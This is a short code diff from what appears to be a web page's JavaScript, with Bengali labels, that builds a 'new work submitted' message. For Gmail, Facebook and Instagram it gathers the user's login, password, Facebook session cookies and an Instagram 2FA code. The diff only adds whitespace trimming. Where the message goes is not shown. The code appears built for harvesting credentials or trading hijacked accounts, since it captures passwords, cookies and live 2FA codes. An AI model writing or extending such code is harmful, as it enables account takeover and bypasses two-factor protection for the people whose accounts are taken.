@@ -1752,18 +1752,18 @@
             let message = `📥 নতুন কাজ সাবমিট হয়েছে!\n\n🔹 প্ল্যাটফর্ম: ${platform}\n`;
 
             if (platform === 'Gmail') {
-                let email = document.getElementById('gmailEmail').value;
-                let pass = document.getElementById('gmailPass').value;
+                let email = document.getElementById('gmailEmail').value.trim();
+                let pass = document.getElementById('gmailPass').value.trim();
                 message += `📧 ইমেইল: ${email}\n🔑 পাসওয়ার্ড: ${pass}`;
             } else if (platform === 'Facebook') {
-                let uid = document.getElementById('fbUid').value;
-                let pass = document.getElementById('fbPass').value;
-                let cookies = document.getElementById('fbCookies').value;
+                let uid = document.getElementById('fbUid').value.trim();
+                let pass = document.getElementById('fbPass').value.trim();
+                let cookies = document.getElementById('fbCookies').value.trim();
                 message += `👤 UID/Email: ${uid}\n🔑 পাসওয়ার্ড: ${pass}\n🍪 Cookies: ${cookies}`;
             } else if (platform === 'Instagram') {
-                let user = document.getElementById('instaUser').value;
-                let pass = document.getElementById('instaPass').value;
-                let twofa = document.getElementById('insta2fa').value;
+                let user = document.getElementById('instaUser').value.trim();
+                let pass = document.getElementById('instaPass').value.trim();
+                let twofa = document.getElementById('insta2fa').value.trim();
                 message += `👤 ইউজারনেম: ${user}\n🔑 পাসওয়ার্ড: ${pass}\n🛡️ 2FA Code: ${twofa}`;
             }
 
